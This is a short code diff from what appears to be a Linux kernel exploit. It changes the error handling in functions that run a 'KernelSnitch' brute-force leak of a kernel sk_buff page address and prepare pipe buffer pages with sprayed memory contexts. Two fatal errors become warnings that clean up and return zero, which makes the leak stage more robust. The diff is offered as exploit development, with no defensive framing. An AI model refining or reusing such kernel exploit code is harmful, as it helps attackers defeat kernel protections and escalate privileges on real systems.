@@ -204,7 +204,17 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   run_kernelsnitch_bruteforce();
   uintptr_t leaked = cleanup_kernelsnitch();
   if (leaked == (uintptr_t)-1) {
-    pr_error("pipe KernelSnitch sk_buff page leak failed\n");
+    pr_warning("pipe KernelSnitch sk_buff page leak failed\n");
+    close_ctx_memfds(&prep);
+    close_ctx_memfds(&spray);
+    close_ctx_memfds(&pre);
+    close_ctx_memfds(&post);
+    free_ctx_storage(&prep);
+    free_ctx_storage(&spray);
+    free_ctx_storage(&pre);
+    free_ctx_storage(&post);
+    free(buf);
+    return 0;
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
 #if defined(APP_REQUIRE_FRESH_P0_SESSION) && APP_REQUIRE_FRESH_P0_SESSION
@@ -276,7 +286,8 @@ uintptr_t prepare_pipe_buffer_page(void) {
   ssize_t got = read(result_pipe[0], &base, sizeof(base));
   SYSCHK(close(result_pipe[0]));
   if (got != (ssize_t)sizeof(base)) {
-    pr_error("pipe page child did not report base\n");
+    pr_warning("pipe page child did not report base\n");
+    base = 0;
   }
   for (size_t i = 0; i < PIPE_DRAIN; i++) {
     close(pipe_fds_drain[i][0]);
